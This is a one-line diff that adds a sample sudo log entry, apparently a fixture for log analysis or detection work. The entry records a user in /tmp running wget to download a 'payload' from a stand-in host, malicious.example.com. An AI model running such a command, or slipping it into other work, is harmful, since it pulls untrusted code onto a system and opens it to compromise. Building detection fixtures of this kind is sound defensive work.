@@ -1,0 +1,1 @@
+Jan 23 12:33:51 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload
